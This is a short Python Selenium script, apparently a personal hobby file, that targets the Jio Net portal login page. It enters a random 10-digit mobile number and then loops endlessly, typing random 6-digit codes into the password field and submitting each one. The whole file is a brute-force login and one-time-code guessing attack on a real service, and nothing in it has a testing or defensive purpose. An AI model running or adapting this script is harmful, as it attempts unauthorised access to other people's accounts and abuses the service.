from selenium import webdriver
from bs4 import BeautifulSoup
from time import sleep # this should go at the top of the file
path = 'C:\Users\lenovo\Documents\Vinay Python\python2\Mechanize and BeautifulSoup\Oas\LPU Students\phantomjs.exe'
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities    
import itertools
from random import randint 
combos = itertools.permutations("0123456789",6)
capabilities = DesiredCapabilities.CHROME
capabilities['loggingPrefs'] = { 'browser':'ALL' }
url = r'https://jionetportal.jio.in/'
#driver = webdriver.PhantomJS(path,desired_capabilities=capabilities)
driver = webdriver.Chrome(desired_capabilities=capabilities)

def randomSix(n):
    rS = 10**(n-1)
    rE = (10**n)-1
    return randint(rS,rE)
def init():
    driver.get(url)
    funct()
def funct():
   # sf = driver.find_element_by_xpath('$x("//input[@type="tel"]")')
    sleep(7)
    sf = driver.find_element(by='name',value='mobile')
    sf.send_keys(str(randomSix(10)))
    sf = driver.find_element_by_name("action")
    sf.click()
    sleep(15)
    while True:
        sf = driver.find_element(by='name',value='password')
        sf.send_keys(int(randomSix(6)))
        sf = driver.find_element_by_name("action")
        sf.click()
        sf = driver.find_element(by='name',value='password')
        sf.clear()
        
    #sf = driver.execute_script(a)
    #for entry in driver.get_log('browser'):
    #   print entry['message'].split(' ')
    #   EncId.append(entry['message'].split(' ')[0])
    sleep(5)    
def exitin():
    driver.quit()
init()
#exitin()
